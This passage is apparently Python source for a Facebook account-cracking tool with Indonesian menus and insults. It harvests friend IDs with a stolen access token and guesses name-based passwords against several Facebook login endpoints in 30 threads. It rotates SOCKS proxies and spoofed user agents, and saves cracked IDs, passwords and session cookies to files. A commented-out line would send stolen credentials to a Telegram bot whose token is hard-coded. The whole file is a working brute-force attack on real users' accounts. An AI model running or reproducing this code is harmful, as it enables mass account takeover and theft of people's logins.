			print(f'{P}─────────────────────────────────────────────────────')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{P}├─[{K}#{P}] {k}{cpkuni[0]}{P}│{k}{cpkuni[1]}')
				nocp +=1
			print(f'{P}─────────────────────────────────────────────────────')
			input(f'{P}[{m} Klik Enter{P} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P}├─[{H}%s{P}] Hasil %s ({h}%s{P} Akun)'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P}├─[{H}%s{P}] Hasil %s ({h}%s {P}Akun)'%(cih,isi,(len(hem))))
			geeh = input(f'└────➢ ')
			print(f'{P}─────────────────────────────────────────────────────')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				#print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				print(f'{P}├─[{H}#{P}] {h}{cpkuni[0]}{P}│{h}{cpkuni[1]}\n{P}├─[{H}#{P}] {h}{cpkuni[2]}')
				nocp +=1
			print(f'{P}─────────────────────────────────────────────────────')
			input(f'{P}[{m}Klik Enter{P}]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		back()

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f'{P}─────────────────────────────────────────────────────')
		jum = int(input(f'{P}┌─[{H}•{P}] input target amount ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{P}├─['+str(yz)+'] Enter the Id : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		coli(f'└───➢ {H}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()

#-----------------[ CRACK FILE ]-----------------#
def dump_file():
	try:vin = os.listdir('DUMP-FILE')
	except FileNotFoundError:
		print(f'{K}└── {M} File Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print(f'{K}└── {M} Kamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP-FILE/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{P}├─[{P}%s{P}] {P}%s {K}[{H}%s{K}]{P} idz'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(f'{P}├─[{P}%s{P}] {P}%s {K}[{H}%s{K}]{P} idz'%(nom,isi,len(hem)))
		hooh = input('└───➢ ')
		try:cuk = lol[hooh]
		except KeyError:
			print(f'{K}└── {M} Pilih Yang Bener Kontol ')
			time.sleep(3)
			back()
		try:lin = open('DUMP-FILE/'+cuk,'r').read().splitlines()
		except:
			print(f'{K}└── {M} File Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for idz in lin:
			id.append(idz)
		setting()

def setting():
	print(f'{P}─────────────────────────────────────────────────────')
	coli(f'{P}┌─[{H}1{P}] Akun Acak ')
	coli(f'├─[{H}2{P}] Akun New ')
	hu = input('└───➢ ')
	if hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	print(f'{P}─────────────────────────────────────────────────────')
	coli(f'{P}┌─[{H}1{P}] Validate [{H}Fast{H}]')
	coli(f'{P}├─[{H}2{P}] Validate2 [{K}Medium{K}]')
	coli(f'{P}├─[{H}3{P}] Async    [{M}Slow{M}]')
	hc = input(f'{P}└───➢ ')
	if hc in ['1','01']:
		method.append('satu')
	elif hc in ['']:
		print('>> Pilih Yang Bener Kontol ')
		setting()
	elif hc in ['2','02']:
		method.append('dua')
	elif hc in ['3','03']:
		method.append('tiga')
	else:
		method.append('satu')
	print(f'{P}─────────────────────────────────────────────────────')
	pwplus=input(f'{P}┌─[{H}•{P}] Tambahkan Password Manual ( Y/t ) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'{P}└───➢ ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()

def passwrd():
	clear()
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(f'{P}>> IP address  : {ip}')
	global prog,des
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'┌─{P}[{H}#{P}] Hasil {h}OK{P} Tersimpan Di : {h}OK/%s {P}'%(okc))
	print(f'└─{P}[{k}#{P}] Hasil {k}CP{P} Tersimpan Di : {k}CP/%s {P}'%(cpc))
	print(f'{P}─────────────────────────────────────────────────────')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
    			for yuzong in id2:
    				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
    				frs = nmf.split(' ')[0]
    				pwv = []
    				if len(nmf)<6:
    					if len(frs)<3:
    						pass
    					else:
    						pwv.append(frs+'123')
    						pwv.append(frs+'1234')
    						pwv.append(frs+'12345')
    						pwv.append(frs+'123456')
    						pwv.append(frs+'321')
    				else:
    					if len(frs)<3:
    						pwv.append(nmf)
    					else:
    						pwv.append(nmf)
    						pwv.append(frs+'123')
    						pwv.append(frs+'1234')
    						pwv.append(frs+'12345')
    						pwv.append(frs+'123456')
    						pwv.append(frs+'321')
    				if 'ya' in pwpluss:
    					for xpwd in pwnya:
    						pwv.append(xpwd)
    				else:pass
    				if 'satu' in method:
    					pool.submit(crack,idf,pwv)
    				elif 'dua' in method:
    					pool.submit(crack1,idf,pwv)
    				elif 'tiga' in method:
    					pool.submit(crack2,idf,pwv)
    				else:
    					pool.submit(crack2,idf,pwv)
		print(f'{P}\n─────────────────────────────────────────────────────')
		print(f'{P}┌─[{H}#{P}] OK : {h}%s '%(ok))
		print(f'{P}└─[{k}#{P}] CP : {k}%s{x} '%(cp))
		print(f'{P}─────────────────────────────────────────────────────')
		print(f'┌─{P}[{H}•{P}] Lanjut Crack Kembali ( Y/t ) ? ')
		woi = input(f'{P}└───➢ ')
		if woi in ['y','Y']:
			back()
		else:
			print(f'{P}─────────────────────────────────────────────────────')
			print(f'\t{P}>>{k} Good Bye Dadaahh{P} << ')
			print(f'{P}─────────────────────────────────────────────────────')
			time.sleep(2)
			exit()
		
def crack(idf,pwv):
	global loop,ok,cp
	rr = random.randint
	war = random.choice([m,k,h,b,u,x])
	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])
	prog.update(des,description=f'\r[deep_white] {H}Validate{H} {war}[{idf}]{P} {(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(vivo)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			headers = {
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'cache-control': 'max-age=0',
				'sec-ch-prefers-color-scheme': 'light',
				'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
				'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': 'Android',
				'sec-ch-ua-platform-version': '13.0.0',
				'sec-fetch-dest': 'document',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-site': 'none',
				'sec-fetch-user': '?1',
				"x-requested-with": "XMLHttpRequest",
				"x-asbd-id": "129477",
				'upgrade-insecure-requests': '1',
				'user-agent': ua,
				'viewport-width': '980',
			}
			params = {
        'api_key': '410293043879622',
        'auth_token': '0880cb6ff7aa55967cce06f2a66b020b',
        'skip_api_login': '1',
        'signed_next': '1',
        'next': 'https://m.facebook.com/v13.0/dialog/oauth?cct_prefetching=0&client_id=410293043879622&cbt=1690549046650&e2e=%7B%22init%22%3A1690549046650%7D&ies=1&sdk=android-13.1.0&sso=chrome_custom_tab&nonce=6ea4dffd-291d-4ce7-8e09-c975ac8eb3ed&scope=openid%2Cpublic_profile%2Cemail&state=%7B%220_auth_logger_id%22%3A%22dff3a521-e7c1-4f2c-bd0e-df948aab3375%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22n192dl8uv3bctlhg8d7t%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb410293043879622%3A%2F%2Fauthorize%2F&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=tohZitG4jv4KvFvV6p96jYruboC6UM_ZTDDpp8NvyJc&ret=login&fbapp_pres=0&logger_id=dff3a521-e7c1-4f2c-bd0e-df948aab3375&tp=unspecified',
        'refsrc': 'deprecated',
        'app_id': '410293043879622',
        'cancel': 'fb410293043879622://authorize/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%220_auth_logger_id%22%3A%22dff3a521-e7c1-4f2c-bd0e-df948aab3375%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22n192dl8uv3bctlhg8d7t%22%7D#_=_',
        'lwv': '101',
          }
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=410293043879622&kid_directed_site=0&app_id=410293043879622&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D410293043879622%26cbt%3D1690549046650%26e2e%3D%257B%2522init%2522%253A1690549046650%257D%26ies%3D1%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D6ea4dffd-291d-4ce7-8e09-c975ac8eb3ed%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522dff3a521-e7c1-4f2c-bd0e-df948aab3375%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522n192dl8uv3bctlhg8d7t%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb410293043879622%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DtohZitG4jv4KvFvV6p96jYruboC6UM_ZTDDpp8NvyJc%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddff3a521-e7c1-4f2c-bd0e-df948aab3375%26tp%3Dunspecified&cancel_url=fb410293043879622%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522dff3a521-e7c1-4f2c-bd0e-df948aab3375%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522n192dl8uv3bctlhg8d7t%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
	  		"m_ts": re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1),
				"li": re.search('name="li" value="(.*?)"',str(p.text)).group(1),
				"try_number": re.search('name="try_number" value="(.*?)"',str(p.text)).group(1),
				"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(p.text)).group(1),
			"uid":idf,
			"next":"https://https://m.facebook.com/login/device-based/login/async/?api_key=410293043879622&auth_token=0880cb6ff7aa55967cce06f2a66b020b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D410293043879622%26cbt%3D1690549046650%26e2e%3D%257B%2522init%2522%253A1690549046650%257D%26ies%3D1%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D6ea4dffd-291d-4ce7-8e09-c975ac8eb3ed%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522dff3a521-e7c1-4f2c-bd0e-df948aab3375%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522n192dl8uv3bctlhg8d7t%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb410293043879622%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DtohZitG4jv4KvFvV6p96jYruboC6UM_ZTDDpp8NvyJc%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddff3a521-e7c1-4f2c-bd0e-df948aab3375%26tp%3Dunspecified&refsrc=deprecated&app_id=410293043879622&cancel=fb410293043879622%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522dff3a521-e7c1-4f2c-bd0e-df948aab3375%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522n192dl8uv3bctlhg8d7t%2522%257D%23_%3D_&lwv=101","flow":"login_no_pin","pass":pw,
			}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',params=params,data=dataa,cookies={'cookie': koki},headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}┌─ {k}{idf}{P}|{k}{pw}\n{P}└─ {Z}{ua}{N}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}┌─ {H}{idf}{P}|{H}{pw}\n{P}└─ {H}{kuki}{N}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(session,coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack1(idf,pwv):
	global loop,ok,cp
	war = random.choice([m,k,h,b,u,x])
	prog.update(des,description=f'\r[deep_white] {H}Validate2{H} {war}[{idf}]{P} {(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(xiomi)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'p.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://p.facebook.com//login/?next&amp;ref=opera_speed_dial&amp;fl&amp;login_from_aymh=1&amp;refid=8')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/device-based/edit/?uid="+idf+"&amp;src=0&amp;refid=8&amp;ref=opera_speed_dial","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'p.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://p.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://p.facebook.com/login/device-based/edit/?uid='+idf+'&amp;src=0&amp;refid=8&amp;ref=opera_speed_dial','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://p.facebook.com/login/device-based/validate-pin/?refid=8&amp;ref=opera_speed_dial',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}┌─ {k}{idf}{P}|{k}{pw}\n{P}└─ {Z}{ua}{N}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}┌─ {H}{idf}{P}|{H}{pw}\n{P}└─ {H}{kuki}{N}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
#				requests.post(f"https://api.telegram.org/bot5888446932:AAEn1cTG_hMDc10Urq3BA-N0Rg1fmsYM8XA/sendMessage?chat_id=-1001986432676&text={idf}|{pw}| {kuki}")
				cek_apk(session,coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def crack2(idf,pwv):
	global loop,ok,cp
	rr = random.randint
	war = random.choice([m,k,h,b,u,x])
	prog.update(des,description=f'\r[deep_white] {H}Sesepuh{H} {war}[{idf}]{P} {(loop)}/{len(id)}[/] [bold green]OK[/]:[bold green]{(ok)} [/]=[bold yellow] CP[/]:[bold yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(mini)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		pw = pw.lower()
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			Memek = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=478507880398192&kid_directed_site=0&app_id=478507880398192&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D478507880398192%26redirect_uri%3Dhttps%253A%252F%252Fgw.aoscdn.com%252Fbase%252Fpassport%252Foauth%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3D2b9c81aa-58b3-442f-84e3-78e95e5b3196%252Cfacebook%252C478507880398192%252C29%252C482%252C8%252Cen%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6ab1d201-1d35-45d5-8460-a8c3744e0d5e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fgw.aoscdn.com%2Fbase%2Fpassport%2Foauth%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2b9c81aa-58b3-442f-84e3-78e95e5b3196%252Cfacebook%252C478507880398192%252C29%252C482%252C8%252Cen%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			params = {
        'api_key': '478507880398192',
        'auth_token': '336eb61e482b50bb2921f7453e4088a9',
        'skip_api_login': '1',
        'signed_next': '1',
        'next': 'https://m.facebook.com/dialog/oauth?client_id=478507880398192&redirect_uri=https%3A%2F%2Fgw.aoscdn.com%2Fbase%2Fpassport%2Foauth%2Fcallback%2Ffacebook&response_type=code&scope=email&state=2b9c81aa-58b3-442f-84e3-78e95e5b3196%2Cfacebook%2C478507880398192%2C29%2C482%2C8%2Cen&ret=login&fbapp_pres=0&logger_id=6ab1d201-1d35-45d5-8460-a8c3744e0d5e&tp=unspecified',
        'refsrc': 'deprecated',
        'app_id': '478507880398192',
        'cancel': 'https://gw.aoscdn.com/base/passport/oauth/callback/facebook?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=2b9c81aa-58b3-442f-84e3-78e95e5b3196%2Cfacebook%2C478507880398192%2C29%2C482%2C8%2Cen#_=_',
        'lwv': '100'
          }
			data = {
				"m_ts": re.search('name="m_ts" value="(.*?)"',str(Memek.text)).group(1),
				"li": re.search('name="li" value="(.*?)"',str(Memek.text)).group(1),
				"try_number": re.search('name="try_number" value="(.*?)"',str(Memek.text)).group(1),
				"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(Memek.text)).group(1),
				"email": idf,
				"prefill_contact_point": "",
				"prefill_source": "",
				"prefill_type": "",
				"first_prefill_source": "",
				"first_prefill_type": "",
				"had_cp_prefilled": "false",
				"had_password_prefilled": "true",
				"is_smart_lock": "true",
				"bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"',str(Memek.text)).group(1),
				"flow":"login_no_pin",
				"pass": pw,
				"jazoest": re.search('name="jazoest" value="(.*?)"',str(Memek.text)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"',str(Memek.text)).group(1),
				"__dyn": "",
				"__csr": "",
				"__a": "",
				"user": "0",
				"_fb_noscript": "true"}
			headers = {
				"Host": "m.facebook.com",
				"content-length": str(rr(2000,2199)),
				"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
				"sec-ch-ua-mobile": "?1",
				"user-agent": ua,
				"viewport-width": "501",
				"x-response-format": "JSONStream",
				"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(Memek.text)).group(1),
				"sec-ch-ua-platform-version": f'"{str(rr(5,13))}.0.0"',
				"content-type": "application/x-www-form-urlencoded",
				"x-requested-with": "XMLHttpRequest",
				"x-asbd-id": "129477",
				"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
				"sec-ch-prefers-color-scheme": "light",
				"sec-ch-ua-platform": "Android",
				"accept": "*/*",
				"origin": "https://m.facebook.com",
				"sec-fetch-site": "same-origin",
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=478507880398192&kid_directed_site=0&app_id=478507880398192&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D478507880398192%26redirect_uri%3Dhttps%253A%252F%252Fgw.aoscdn.com%252Fbase%252Fpassport%252Foauth%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3D2b9c81aa-58b3-442f-84e3-78e95e5b3196%252Cfacebook%252C478507880398192%252C29%252C482%252C8%252Cen%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6ab1d201-1d35-45d5-8460-a8c3744e0d5e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fgw.aoscdn.com%2Fbase%2Fpassport%2Foauth%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2b9c81aa-58b3-442f-84e3-78e95e5b3196%252Cfacebook%252C478507880398192%252C29%252C482%252C8%252Cen%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=478507880398192&auth_token=336eb61e482b50bb2921f7453e4088a9&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D478507880398192%26redirect_uri%3Dhttps%253A%252F%252Fgw.aoscdn.com%252Fbase%252Fpassport%252Foauth%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3D2b9c81aa-58b3-442f-84e3-78e95e5b3196%252Cfacebook%252C478507880398192%252C29%252C482%252C8%252Cen%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6ab1d201-1d35-45d5-8460-a8c3744e0d5e%26tp%3Dunspecified&refsrc=deprecated&app_id=478507880398192&cancel=https%3A%2F%2Fgw.aoscdn.com%2Fbase%2Fpassport%2Foauth%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2b9c81aa-58b3-442f-84e3-78e95e5b3196%252Cfacebook%252C478507880398192%252C29%252C482%252C8%252Cen%23_%3D_&lwv=100',params=params,headers=headers,data=data,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f'\r{P}┌─ {k}{idf}{P}|{k}{pw}\n{P}└─ {Z}{ua}{N}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}┌─ {H}{idf}{P}|{H}{pw}\n{P}└─ {H}{kuki}{N}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(session,coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()
